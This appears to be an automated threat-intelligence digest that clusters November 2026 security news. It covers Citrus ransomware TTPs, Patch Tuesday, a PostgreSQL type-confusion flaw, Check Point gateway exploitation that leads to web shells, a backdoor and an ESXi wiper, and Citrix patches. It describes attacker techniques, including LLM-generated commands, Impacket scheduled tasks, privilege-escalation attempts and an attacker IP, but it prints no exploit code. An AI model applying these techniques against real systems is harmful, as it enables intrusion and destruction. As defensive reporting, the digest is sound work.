contractors’ employees to connect to corporate VPNs or directly to internet-facing terminal servers over RDP. Execution: commands, LLMs, and Impacket The attackers run commands on compromised systems through the standard Windows command interpreter and PowerShell. As the attack progresses, they create and run PowerShell scripts, batch files, and commands generated by LLMs. One example of the latter is the commands below, which disable the account of one of the administrators. Comment translation # Disable account # Verify result Both commands come with comments, something attackers rarely bother with, so the comments very likely point to LLM use. And the models did more than generate commands. The attackers also produced full scripts, complete with the comments typical of LLM output. Comment translation # Creating background tasks for each computer with a thread limit # Concurrent task limit control # Quick ping The fragment above comes from a script Citrus used to enumerate active user sessions on domain systems. Besides LLMs, the attackers use atexec, a classic tool from the Impacket collection, to create scheduled tasks that run commands on hosts: Task name Launched executable file sIErKswD C:\Windows\System32\..\System32\cmd.exe PpMBCCSR C:\Windows\system32\cmd.exe QwZtLmNp C:\Windows\..\Windows\System32\cmd.exe We did not see the exact commands behind these tasks, but Group Policy was refreshed after they ran, so they most likely executed gpupdate /force . When the group compromises 1C:Enterprise servers, it uses external data processors (1C-Shell) to run commands. Persistence: scheduled tasks Citrus uses scheduled tasks to launch its malicious tools automatically. The attackers create the tasks manually through PowerShell: On systems that are not regularly rebooted, such as terminal servers, they sometimes run their tools without establishing persistence at all. Privilege Escalation: vulnerabilities and configuration flaws In every case we know of, the contractor domain account used for initial access had very limited privileges, so the attackers tried to escalate them. To do this, they attempted to exploit the authentication bypass vulnerability CVE-2026-54121 (Certighost) ; these attempts created machine accounts with telltale names in Active Directory, such as: GHOSTAUFTAFGS GHOSTCZ
```

#### Corroborating sources (1)

- **Kaspersky Securelist** (threat_research_primary)
  - Title: Citrus Ransomware: VLESS for traffic, Sn00py for encryption, and LLMs lending a hand
  - Published: 2026-11-11T10:00:25+00:00
  - Link: https://securelist.com/citrus-ransomware/121879/
  - Summary: We break down the Citrus Ransomware group's attacks: the attackers' TTPs and tooling, including VLESS traffic tunneling and LLM use, plus their links to Toy Ghouls.

### Cluster b999342a06 — score 10

- Title: Five Findings From the 2027 State of Threat Intelligence
- Source: Recorded Future (threat_research_primary)
- Published: 2026-11-12T00:00:00+00:00
- Link: https://www.recordedfuture.com/blog/state-of-threat-intelligence-2027
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
What 768 security professionals told us about consolidation, ROI, and AI. Get five takeaways from the 2027 State of Threat Intelligence.
```

#### Full body

```
Five Findings From the 2027 State of Threat Intelligence Worth Noting for the Year Ahead The much anticipated State of Threat Intelligence report has just been published. The State of Threat Intelligence report is based on a survey Recorded Future conducted with UserEvidence of 768 cybersecurity professionals at enterprises with at least 1,000 employees. It’s the latest edition in our annual report series, where we gauge how threat intelligence is currently being used, funded, and measured. When I first saw the results of this year’s survey, a few findings stood out to me as especially relevant for anyone who runs, funds, or relies on a threat intelligence program and is planning for the year ahead. Here are my top five findings and why. 1. Cost is the least common reason to consolidate A strong majority of respondents (79%) said they plan to consolidate threat intelligence vendors in the next year. That alone is no huge surprise, especially given that respondents reported using an average of five different vendors. Cost would be a reasonable guess for why, but reducing costs actually ranked last of five drivers, at 5%. The drivers that ranked higher point to what teams want from consolidation: Improving correlation across signals (34%) : connecting intelligence across threat domains and internal telemetry into one view of risk. Bringing siloed tools together (29%) : ensuring different risk owners can efficiently act on intelligence. Simplifying operations (22%) : fewer interfaces and handoffs so teams can act on intelligence sooner. Reducing vendor-management overhead (9%) : fewer vendors to evaluate and renew. Overall investment is still rising: 83% plan to increase threat intelligence spending in the next 12 months. Teams are consolidating to get better results from their intelligence, not to cut spend. That puts the focus on outcomes. Jason Steer, CISO at Recorded Future, framed the risk well: consolidation only counts “if that provider has the same or better outcomes.” For anyone evaluating vendors this year, that’s the bar to consider. Especially as teams expand the reach of their threat intelligence programs and support more stakeholders across the enterprise, they’re pursuing vendors that provide coverage across the risk domains that matter for those teams, but equally important that friction is not created in that pursuit of breadth, and that the organization is able to see how threats across disparate domains actually connect. 2. Only 25% have external intelligence and internal telemetry in one place Correlation is the top consolidation driver, yet only a quarter of respondents say external intelligence and internal telemetry reside in one place. The rest break down as follows: 52% are partially integrated across some tools. 18% rely on manual correlation by analysts. 5% keep the two in separate workflows. Poor integration with existing tools and workflows was also the most-cited pain point with current vendors. This doesn’t mean every team needs to move everything into a single tool. What often matters is whether external intelligence can be correlated with internal signals across the tools a team already uses, without an analyst doing it by hand. Collective Insights® is built for this: it pulls detections from a team’s existing security tools and enriches them with Recorded Future intelligence. For the 70% who are partially integrated or correlating manually, it’s worth identifying where that manual handoff still happens. 3. Confidence in ROI is high, but few measure cost savings Nearly every respondent (99%) formally measures the value of their threat intelligence program, and 57% say they are very confident in their ability to quantify its ROI. But when asked how they measure value, more than half (58%) of that very confident group did not include cost savings. Across all respondents, 39% measure cost savings, and 31% measure whether triggered actions actually worked. The most common metrics are operational: Enha
```

#### Corroborating sources (1)

- **Recorded Future** (threat_research_primary)
  - Title: Five Findings From the 2027 State of Threat Intelligence
  - Published: 2026-11-12T00:00:00+00:00
  - Link: https://www.recordedfuture.com/blog/state-of-threat-intelligence-2027
  - Summary: What 768 security professionals told us about consolidation, ROI, and AI. Get five takeaways from the 2027 State of Threat Intelligence.

### Cluster 7a32cbbdae — score 10

- Title: Metrics That Matter: Are We Becoming Harder to Attack?
- Source: Horizon3 Attack Research (offensive_vulnerability_research)
- Published: 2026-11-09T03:26:08+00:00
- Link: https://horizon3.ai/intelligence/infographics/ctem-metrics-that-matter/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
Closed tickets and remediation SLAs show what teams have done, not whether the environment is harder to attack. This infographic outlines four Exposure Management metrics: attack paths and impacts, speed of impact reduction, verification coverage, and recurrence.
```

#### Full body

```
Metrics That Matter: Are We Becoming Harder to Attack? Stephen Gates November 8, 2026 Infographics Vulnerability counts, closed tickets, and remediation SLAs show what security teams have done. They cannot, by themselves, show whether the environment became harder to attack. This Horizon3 infographic reframes measurement around a more direct question: are we becoming harder to attack? It starts from the impact attackers can achieve, because vulnerable does not always equal exploitable, and exploitable does not always equal impact. Four Metrics for Measuring Exposure Management Effectiveness Attack paths and impacts: Track proven attack paths across testing cycles, and their consequences for critical systems, sensitive data, and business operations, to see whether they are decreasing. Speed of impact reduction: Measure how long it takes to move from validation to mitigation, remediation, and verification that the original impact is no longer achievable. Verification coverage: Measure the percentage of reported remediations that were retested and proven to eliminate the original impact. Recurrence: Track how often previously eliminated attack paths or impacts return as the environment changes. Why These Metrics Matter Activity metrics describe effort. These four metrics focus on outcomes: whether proven impact is shrinking, how quickly it is eliminated, whether completed work was verified, and whether improvements hold over time. Each cycle’s evidence then informs scope and priorities as teams Discover, Validate, Prioritize, Remediate, Verify, and Repeat. Download the Infographic View the full infographic to see how the four metrics fit together, and download it to share with your security and leadership teams. To see how to measure metrics that matter in action, get a demo from our team. Download the Infographic How can NodeZero help you? Let our experts walk you through a demonstration of NodeZero ® , so you can see how to put it to work for your organization. Get a Demo Share:
```

#### Corroborating sources (1)

- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - Title: Metrics That Matter: Are We Becoming Harder to Attack?
  - Published: 2026-11-09T03:26:08+00:00
  - Link: https://horizon3.ai/intelligence/infographics/ctem-metrics-that-matter/
  - Summary: Closed tickets and remediation SLAs show what teams have done, not whether the environment is harder to attack. This infographic outlines four Exposure Management metrics: attack paths and impacts, speed of impact reduction, verification coverage, and recurrence.

### Cluster d022c23d6b — score 10

- Title: Policy and Disclosure: 2026 Edition
- Source: Google Project Zero (offensive_vulnerability_research)
- Published: 2026-11-13T08:00:00+00:00
- Link: https://projectzero.google/2026/11/disclosure-policy.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, vulnerability_disclosure
- urgency_signals: actively_exploited
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- threat_categories: vulnerability_disclosure, active_exploitation
- urgency_signals: actively_exploited
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
Since 2021, Project Zero has followed a “90 + 30” vulnerability disclosure policy, allowing vendors up to 90 days to remediate a vulnerability plus an extra 30 days “soak time” for patch rollout. Our goal was to encourage faster patching and give vendors time to deliver patches to users. The advent of AI-assisted vulnerability discovery and exploitation has changed the threat landscape such that the vulnerability remediation timeline encouraged by our disclosure policy is clearly insufficient. LLMs have increased the speed at which attackers can find and exploit vulnerabilities, alongside the risk that multiple parties, including malicious ones, discover the same bug. A vulnerability reported today presents a much higher immediate risk to users than one reported last year. In this new environment, it is crucial that vendors move towards remediating vulnerabilities faster.
```

#### Full body

```
Since 2021, Project Zero has followed a â90 + 30â vulnerability disclosure policy, allowing vendors up to 90 days to remediate a vulnerability plus an extra 30 days âsoak timeâ for patch rollout. Our goal was to encourage faster patching and give vendors time to deliver patches to users. The advent of AI-assisted vulnerability discovery and exploitation has changed the threat landscape such that the vulnerability remediation timeline encouraged by our disclosure policy is clearly insufficient. LLMs have increased the speed at which attackers can find and exploit vulnerabilities, alongside the risk that multiple parties, including malicious ones, discover the same bug. A vulnerability reported today presents a much higher immediate risk to users than one reported last year. In this new environment, it is crucial that vendors move towards remediating vulnerabilities faster. LLMs have also decreased the time it takes for attackers to reverse engineer and exploit a vulnerability based on a patch, to the extent that zero patch-to-exploitation time is a reasonable, though imperfect, model of attacker behavior. Patch soak time is no longer meaningful in a world where attackers can almost immediately determine bug details from a patch, and can put users at risk by creating a false sense of secrecy. âPatch gapâ is the time between a fix being released for a security vulnerability and the user installing the relevant update. It is equally crucial that vendors reduce patch gap, either by reducing patch rollout time or using other strategies to protect users while remediation is in progress. LLMs have also increased the volume of vulnerabilities that Project Zero reports. We are finding several vulnerabilities a week in targets where we once found a few vulnerabilities a year. Aspects of our policy that require vendor negotiation or agreement, including determining whether a bug is fixed and whether grace period applies, are quickly becoming unmanageable. Today, we are announcing a new vulnerability disclosure policy, created with the following goals in mind: Encourage faster vulnerability remediation Encourage vendors to reduce âpatch gapâ Allow for the policy to be automated by both Project Zero and vendors Our new policy: âFull Xâ Vulnerabilities will be disclosed X days after they are reported to the vendor. Starting today, our policy is âFull 90â, i.e. vulnerabilities will be disclosed 90 days after they are reported to the vendor. On February 2, 2027, we will move to a âFull 60â policy where vulnerabilities are disclosed after 60 days. On January 3, 2028, we will move to a âFull 30â policy where vulnerabilities are disclosed after 30 days. We are also removing most âspecial casesâ from our disclosure policy, including grace period and variant policy. The only exceptions to our new policy are: Vulnerabilities actively exploited in the wild -- ITW vulnerabilities will be handled according to Googleâs application security vulnerability disclosure policy Public vulnerabilities -- Project Zero may make details of a vulnerability public, at our discretion, if the details have already been made public by others Vendor request -- We will make vulnerability details public if the vendor we reported it to requests it Why reduce remediation time gradually? Project Zero solicited feedback from the vendors we report the most vulnerabilities to as a part of developing this new policy. An overarching concern was that immediately changing the policy could harm users by making unfixed vulnerabilities available to attackers while vendors are in the process of improving their remediation processes and technology. While the benefits of delaying disclosure are declining due to the increased probability that attackers will discover a vulnerability during the embargo period, we still feel there are benefits in the short term. In addition, vendors mentioned two more subtle concerns. One was that an overly-aggressive dis
```

#### Corroborating sources (1)

- **Google Project Zero** (offensive_vulnerability_research)
  - Title: Policy and Disclosure: 2026 Edition
  - Published: 2026-11-13T08:00:00+00:00
  - Link: https://projectzero.google/2026/11/disclosure-policy.html
  - Summary: Since 2021, Project Zero has followed a “90 + 30” vulnerability disclosure policy, allowing vendors up to 90 days to remediate a vulnerability plus an extra 30 days “soak time” for patch rollout. Our goal was to encourage faster patching and give vendors time to deliver patches to users. The advent of AI-assisted vulnerability discovery and exploitation has changed the threat landscape such that the vulnerability remediation timeline encouraged by our disclosure policy is clearly insufficient. LLMs have increased the speed at which attackers can find and exploit vulnerabilities, alongside the risk that multiple parties, including malicious ones, discover the same bug. A vulnerability reported today presents a much higher immediate risk to users than one reported last year. In this new environment, it is crucial that vendors move towards remediating vulnerabilities faster.

### Cluster ed2e51b312 — score 10

- Title: Microsoft Fixes Nearly 1,100 Security Vulnerabilities
- Source: Krebs on Security (practitioner_analysis)
- Published: 2026-11-10T21:55:03+00:00
- Link: https://krebsonsecurity.com/2026/11/microsoft-fixes-nearly-1100-security-vulnerabilities/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, zero_day
- affected_products: Apple iOS/macOS, Ivanti, Microsoft 365
- cve_ids: CVE-2026-124194, CVE-2026-125350
- urgency_signals: actively_exploited, zero_day
- content_type: news_report
- confidence_tier: tier_3_analysis

#### Primary article taxonomy
- threat_categories: zero_day, active_exploitation
- affected_products: Microsoft 365, Apple iOS/macOS, Ivanti
- cve_ids: CVE-2026-124194, CVE-2026-125350
- urgency_signals: actively_exploited, zero_day
- content_type: news_report
- confidence_tier: tier_3_analysis

#### Summary

```
Microsoft did another four-digit patch drop today, releasing updates to fix almost 1,100 security vulnerabilities in its Windows operating systems and supported software. This month's Patch Tuesday addresses 63 critical flaws -- including a zero-day in Microsoft Outlook -- and comes amid important security updates from other software makers, including Adobe, Apple, Google and Mozilla.
```

#### Full body

```
Microsoft did another four-digit patch drop today, releasing updates to fix almost 1,100 security vulnerabilities in its Windows operating systems and supported software. This month’s Patch Tuesday addresses 63 critical flaws — including a zero-day in Microsoft Outlook — and comes amid important security updates from other software makers, including Adobe , Apple , Google and Mozilla . Image: Shutterstock.com. Diorama by @zepp1969. November’s patch release from Redmond tackles 1,093 vulnerabilities, fixing 63 “critical” flaws that can be exploited to seize control over a Windows system with little or no help from users. Nearly half of those critical bugs are remote code execution vulnerabilities. Overall, 535 of the flaws addressed this month allow an attacker to elevate their privileges on a vulnerable device. This latest round of updates means Microsoft has shipped more than 5,100 security patches so far this year, a staggering number considering that a year ago Microsoft was averaging around 100 patches per month. Microsoft credits advances in artificial intelligence for helping to find (and fix) such a large volume of security bugs in recent months. Last month, Microsoft pushed more than 1,400 fixes. According to Redmond, just one of the flaws is already seeing active exploitation: CVE-2026-124194 , a spoofing bug in Outlook. The advisory for CVE-2026-124194 says it affects Microsoft 365 Apps for Enterprise and editions of Microsoft Office . Several other major software makers pushed security updates this week to fix critical weaknesses in their products. Apple on Monday released out-of-cycle security updates to fix at least nine vulnerabilities in iOS/iPadOS , macOS , watchOS and visionOS . Among the weaknesses reportedly fixed in Apple’s release include an iMessage flaw that could let a remote attacker join a group chat and receive its messages; the updates also fix a separate iMessage flaw that could let someone added to a group access messages sent before they joined. Lee Neely , an instructor at the SANS Institute , noted that Apple backported the fix to iOS 18. “I take notice when Apple releases fixes to more than two versions,” Neely wrote in a SANS newsletter today. “You really need to get to version 27.2.1 of their OSes and push folks who are holding onto devices which cannot run the current version. The best plan often involves setting an upgrade date for old hardware. Run through all your Apple devices and make sure everything is up to date, don’t assume the fixes went out automatically.” Google this week released Chrome version 157.0.8103.50 , which resolves nine security holes, including CVE-2026-125350 , the sixth zero-day vulnerability this year for Chrome (this bug also is being patched in Chromium-based browsers like Edge). The latest Chrome version follows its November 3 release, which fixed 213 vulnerabilities. A new version of Mozilla Firefox out today ( Firefox 160 ) resolves almost 100 CVEs, about half of them high severity. Adobe today released patches for at least 110 vulnerabilities across a range of products, with nearly half of the flaws rated high severity. Adobe said there is no evidence any of the security holes it addressed this month are being actively exploited. Chris Goettl , vice president of product management at Ivanti , said it’s easy for security teams at large enterprises to feel overwhelmed by the volume and criticality of patches from Microsoft lately. But he notes that while some 95,000 vulnerabilities have been assigned CVEs this year across all vendors, only 217 have so far this year been added to the Known Exploited Vulnerabilities (KEV) list maintained by the U.S. Cybersecurity and Infrastructure Security Agency (CISA). “Roughly four in ten of this year’s exploited vulnerabilities sit in operating systems, endpoint software, browsers, and server platforms, which a continuous patch strategy can close quickly,” Goettl said.”The rest calls for exposure management alongside patchi
```

#### Corroborating sources (1)

- **Krebs on Security** (practitioner_analysis)
  - Title: Microsoft Fixes Nearly 1,100 Security Vulnerabilities
  - Published: 2026-11-10T21:55:03+00:00
  - Link: https://krebsonsecurity.com/2026/11/microsoft-fixes-nearly-1100-security-vulnerabilities/
  - Summary: Microsoft did another four-digit patch drop today, releasing updates to fix almost 1,100 security vulnerabilities in its Windows operating systems and supported software. This month's Patch Tuesday addresses 63 critical flaws -- including a zero-day in Microsoft Outlook -- and comes amid important security updates from other software makers, including Adobe, Apple, Google and Mozilla.

### Cluster 06bffa03c1 — score 10

- Title: PostgreSQL Patches 52 Flaws, Including 22-Year-Old Bug Enabling Authenticated RCE
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-11-13T16:53:08+00:00
- Link: https://thehackernews.com/2026/11/postgresql-patches-52-flaws-including.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-6460

#### Cluster taxonomy (union across members)
- cve_ids: CVE-2026-116322, CVE-2026-6460
- urgency_signals: no_patch_yet, preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- cve_ids: CVE-2026-6460, CVE-2026-116322
- urgency_signals: preauth_unauth, no_patch_yet
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
A type confusion flaw in PostgreSQL lets a database user who can create objects run code on the server. Updates released yesterday fix it, along with 51 other security flaws. Full protection from this flaw also requires rebuilding any C-language extensions installed on the server. The flaw, tracked as CVE-2026-6460, has a CVSS score of 8.8. Any code run this way has the rights of the operating
```

#### Full body

```
PostgreSQL Patches 52 Flaws, Including 22-Year-Old Bug Enabling Authenticated RCE  Swati Khandelwal  Nov 13, 2026 Vulnerability / Database Security A type confusion flaw in PostgreSQL lets a database user who can create objects run code on the server. Updates released yesterday fix it, along with 51 other security flaws. Full protection from this flaw also requires rebuilding any C-language extensions installed on the server. The flaw, tracked as CVE-2026-6460 , has a CVSS score of 8.8. Any code run this way has the rights of the operating system user that runs PostgreSQL. All versions before 18.7, 17.12, 16.16, 15.20, and 14.25 are affected. The PostgreSQL Global Development Group, which publishes the database's releases, has not reported any attacks using the flaw. CISA's assessment in the CVE record also lists exploitation as none. The flaw involves composite types, which are types built from named fields, each with its own data type. A field's type can be changed while older values of that type are still held in other parts of the server. The server could then read an old value as if it had the new type. The fix, described in the project's release notes , adds version checks so the server can detect a value that no longer matches its type. Security researcher Mehmet Ince described a working exploit for the flaw, demonstrated on PostgreSQL 18.6, in a technical writeup published this week. His method is to prepare a query that holds a value, change the type of one of the value's fields, and then run the query. The writeup includes the SQL that crashes an unpatched server this way and a second step that leaks memory addresses. It does not include the SQL for the final step, which makes the server run a command. He wrote that he could "trigger this crash as a lowest-privileged login role." The project's security advisory describes the attacker only as someone who can create objects, without saying which privileges that takes. Red Hat, which ships PostgreSQL packages, says in its CVE assessment that an attacker needs a database login with the ability to create or modify objects. None of these sources says whether an account with only default privileges can go beyond the crash to run code. Ince traces the root of the flaw to May 5, 2004, when PostgreSQL gained the ability to change a column's type. His technique for running code relies on a later change made on May 14, 2015. He also adapted the exploit for managed PostgreSQL services and privately shared proofs of concept with their security teams in August. The providers he worked with include AWS (Aurora and RDS), Microsoft (Azure PostgreSQL), Google (AlloyDB), Supabase, Databricks, and Ubicloud. The writeup does not give each service's current patch status. The project credits more than a dozen reporters for CVE-2026-6460 , including the researcher, and credits him on five other flaws in the same release. The project rates 32 of the 52 flaws at 8.8, the highest score in the release. Based on the scores in its vulnerability index , only one flaw in the server requires neither a login nor any user action. That flaw, CVE-2026-116322 , lets an unauthenticated client trigger a restart of PostgreSQL 18 servers. Several other fixes are in client tools. A crafted archive can make pg_restore run code as the user running it. A compromised source server can make psql run code through the restore script in pg_dump's tar output. What Administrators Should Do Update the server to 18.7, 17.12, 16.16, 15.20, or 14.25, matching your major version. Rebuild or update every C-language extension at the same time as the server. Extensions built against older releases still load, but they "may not be protected from the vulnerabilities fixed in this release," according to a repository notice from the project's RPM package maintainers. Some extensions will also need source-code changes. Extensions rebuilt for the new releases can fail to load on older servers. Extension packages in the project's RP
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: PostgreSQL Patches 52 Flaws, Including 22-Year-Old Bug Enabling Authenticated RCE
  - Published: 2026-11-13T16:53:08+00:00
  - Link: https://thehackernews.com/2026/11/postgresql-patches-52-flaws-including.html
  - Summary: A type confusion flaw in PostgreSQL lets a database user who can create objects run code on the server. Updates released yesterday fix it, along with 51 other security flaws. Full protection from this flaw also requires rebuilding any C-language extensions installed on the server. The flaw, tracked as CVE-2026-6460, has a CVSS score of 8.8. Any code run this way has the rights of the operating

### Cluster ab668646b3 — score 10

- Title: Hackers Exploit PHP2Shell Flaws in Check Point Gateways to Deploy TSGA Backdoor and Wipe ESXi Files
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-11-13T08:05:49+00:00
- Link: https://thehackernews.com/2026/11/hackers-exploit-php2shell-flaws-in.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, web_shell_backdoor
- affected_products: VMware
- cve_ids: CVE-2026-109618, CVE-2026-109619, CVE-2026-123039
- urgency_signals: no_patch_yet
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: apt_espionage, web_shell_backdoor
- affected_products: VMware
- cve_ids: CVE-2026-123039, CVE-2026-109618, CVE-2026-109619
- urgency_signals: no_patch_yet
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
An unknown threat actor has been observed targeting unpatched Check Point Security Gateways to obtain initial access via the PHP2Shell vulnerabilities and then a previously unreported local privilege escalation flaw in Gaia OS to deploy a backdoor called TSGA. The activity, detailed by Check Point, began on October 30, 2026, and targeted Israeli organizations, with a broader follow-up
```

#### Full body

```
Hackers Exploit PHP2Shell Flaws in Check Point Gateways to Deploy TSGA Backdoor and Wipe ESXi Files  Ravie Lakshmanan  Nov 13, 2026 Vulnerability / Cyber Espionage An unknown threat actor has been observed targeting unpatched Check Point Security Gateways to obtain initial access via the PHP2Shell vulnerabilities and then a previously unreported local privilege escalation flaw in Gaia OS to deploy a backdoor called TSGA . The activity, detailed by Check Point, began on October 30, 2026, and targeted Israeli organizations, with a broader follow-up wave on November 2, 2026, that targeted organizations across multiple countries and sectors. Some of the organizations singled out in the first wave have also been at the receiving end of destructive actions that include the deployment of wiper malware. "PHP2Shell provided initial access, followed by privilege escalation through the DynamicCLI interface, tracked as CVE-2026-123039 ," Check Point said. "The attackers then deployed PHP web shells, the persistent TSGA backdoor, and its embedded TSProxy networking component." "The attackers pivoted from the gateway to a VMware ESXi host over SSH, deployed the destroy_v6 wiper, and left politically themed DREAM_ANNEXATION.txt notes during the destructive stage." CVE-2026-123039 (CVSS score: 7.8) is a missing authorization flaw that could enable privilege escalation to root in the DynamicCLI process, enabling any authenticated local user to run arbitrary commands by writing a single request to the socket. "The issue is a local privilege escalation and requires the attacker to already have local code execution on the appliance," Check Point said, adding it "observed an active exploit of this vulnerability against a couple of dozen customers." The issue impacts versions R82.20, R82.10, R82, R81.20, R81.10, and R81 of the following products - Check Point Force Firewalls Check Point Management and Log Servers Multi-Domain Security Management and Multi-Domain Log Server Maestro Orchestrator "In late October 2026, approximately one week after a security fix became available, activity originating from 130.94.19[.]204 targeted Israeli organizations through vulnerable Mobile Access portals on Check Point Security Gateways," Check Point said. "Evidence suggested some cases of a successful compromise, with exploitation activity consistent with PHP2Shell , associated with CVE-2026-109618 and CVE-2026-109619 ." After obtaining initial access, the unknown hacking group is said to have escalated privileges from the portal service account to root by weaponizing CVE-2026-123039 and deploying PHP web shells with an aim to establish persistent access. The web shells support command execution and file upload capabilities. The November 2, 2026, wave is said to have targeted some Israeli organizations that had already been targeted in the first wave, alongside other organizations worldwide, without demonstrating any specific geographic or sector preference, indicating an opportunistic initial-access effort. The access afforded by the web shell paves the way for TSGA, a standalone passive backdoor that also includes a second component called TSProxy. TSGA, deployed as slot_CPconfigdaemon, has been described as a Linux gateway implant with Check Point-specific functionality, offering encrypted remote access, configuration theft, backup and snapshot persistence, process injection, and binary firewall-log tampering. "[TSProxy's] injection code loads this library into selected appliance processes, where it intercepts networking functions to handle specially marked attacker connections while allowing ordinary traffic to continue," Check Point said. "This combines a persistent standalone backdoor with concealed access through existing appliance services." Some of the other post-exploitation actions observed are listed below - Deploying the gogo scanner on the gateway to discover internal assets and services across the network. Moving laterally to a VMware ESXi host o
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Hackers Exploit PHP2Shell Flaws in Check Point Gateways to Deploy TSGA Backdoor and Wipe ESXi Files
  - Published: 2026-11-13T08:05:49+00:00
  - Link: https://thehackernews.com/2026/11/hackers-exploit-php2shell-flaws-in.html
  - Summary: An unknown threat actor has been observed targeting unpatched Check Point Security Gateways to obtain initial access via the PHP2Shell vulnerabilities and then a previously unreported local privilege escalation flaw in Gaia OS to deploy a backdoor called TSGA. The activity, detailed by Check Point, began on October 30, 2026, and targeted Israeli organizations, with a broader follow-up

### Cluster cb75cedcf6 — score 10

- Title: Citrix Patches 12 NetScaler and Secure Access Client Flaws, Including Authentication Bypass
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-11-12T15:38:49+00:00
- Link: https://thehackernews.com/2026/11/citrix-patches-12-netscaler-and-secure.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-120868, Citrix

#### Cluster taxonomy (union across members)
- threat_categories: ddos
- affected_products: Citrix
- cve_ids: CVE-2026-107407, CVE-2026-107408, CVE-2026-107409, CVE-2026-107410, CVE-2026-120868
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ddos
- affected_products: Citrix
- cve_ids: CVE-2026-120868, CVE-2026-107407, CVE-2026-107408, CVE-2026-107409, CVE-2026-107410
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Citrix has released patches for multiple critical security flaws impacting NetScaler ADC, Citrix NetScaler Gateway, and NetScaler Console that could lead to denial-of-service (DoS) or an authentication bypass. The critical vulnerabilities that impact NetScaler ADC and NetScaler Gateway are listed below - CVE-2026-120868 (CVSS score: 9.3) - A memory overflow vulnerability in Packet
```

#### Full body

```
Citrix Patches 12 NetScaler and Secure Access Client Flaws, Including Authentication Bypass  Ravie Lakshmanan  Nov 12, 2026 Vulnerability / Network Security Citrix has released patches for multiple critical security flaws impacting NetScaler ADC, Citrix NetScaler Gateway, and NetScaler Console that could lead to denial-of-service (DoS) or an authentication bypass. The critical vulnerabilities that impact NetScaler ADC and NetScaler Gateway are listed below - CVE-2026-120868 (CVSS score: 9.3) - A memory overflow vulnerability in Packet Processing can lead to unpredictable or erroneous behavior or DoS. (All NetScaler ADC and NetScaler Gateway deployments) CVE-2026-107407 (CVSS score: 9.3) - A memory overflow vulnerability in SMPP traffic can lead to unpredictable or erroneous behavior or DoS. (NetScaler ADC configured with a Load Balancing or Content Switching virtual server of type SMPP) CVE-2026-107408 (CVSS score: 9.3) - A memory corruption vulnerability in DNS / DNS-over-HTTPS (DoH) can lead to unpredictable or erroneous behavior or DoS. (NetScaler ADC configured for DNS load balancing and recursive DNS resolution) CVE-2026-107409 (CVSS score: 9.3) - A memory corruption vulnerability in DNS-over-HTTPS (DoH) can lead to unpredictable or erroneous behavior or DoS. (NetScaler configured with DNS Load Balancing over HTTPS) CVE-2026-107410 (CVSS score: 9.3) - A memory overflow in NetScaler Push can lead to unpredictable or erroneous behavior or DoS. (NetScaler configured as Load Balancing virtual server of type PUSH) CVE-2026-107412 (CVSS score: 9.5) - Multiple memory overflow vulnerabilities can lead to unpredictable or erroneous behavior and DoS. (NetScaler configured as a Gateway or an AAA virtual server) CVE-2026-107415 (CVSS score: 9.3) - A memory overflow vulnerability in Email OTP authentication can lead to unpredictable or erroneous behavior or DoS. (NetScaler ADC or NetScaler Gateway configured with an Email Action) CVE-2026-111344 (CVSS score: 9.3) - A memory overflow vulnerability in Endpoint Analysis (EPA/EPAS) can lead to unpredictable or erroneous behavior or DoS. (NetScaler configured as a VPN virtual server or an authentication (AAA) virtual server with Endpoint Analysis) CVE-2026-120864 (CVSS score: 9.3) - A memory overflow vulnerability in ICA proxy can lead to unpredictable or erroneous behavior or DoS. (NetScaler configured as a Gateway VPN virtual server, an AAA virtual server, or a CR virtual server of type HDX) All the issues have been patched in the following versions - Citrix NetScaler ADC and Citrix NetScaler Gateway 14.1-73.57 and later releases Citrix NetScaler ADC and Citrix NetScaler Gateway 13.1-64.39 and later releases of 13.1 Citrix NetScaler ADC 14.1-FIPS 14.1-73.58 FIPS and later releases of 14.1-FIPS Citrix NetScaler ADC 13.1-FIPS and 13.1-NDcPP 13.1-37.293 and later releases of 13.1-FIPS and 13.1-NDcPP Also addressed by Citrix are a number of flaws in NetScaler Console and Secure Access Client for Windows and Linux - CVE-2026-120869 (CVSS score: 9.4) - An improper authentication vulnerability in NetScaler Console can allow an unauthenticated attacker to bypass authentication controls to access restricted resources on the appliance. (Fixed in NetScaler Console 14.1-74.34 and later) CVE-2026-118268 (CVSS score: 8.5) - An improper privilege management vulnerability in Secure Access Client for Windows can allow a low-privileged user to escalate privileges to SYSTEM. (Fixed in Secure Access Client for Windows 26.11.1.6 and later) CVE-2026-118269 (CVSS score: 8.5) - An improper privilege management vulnerability in Secure Access Client for Linux can 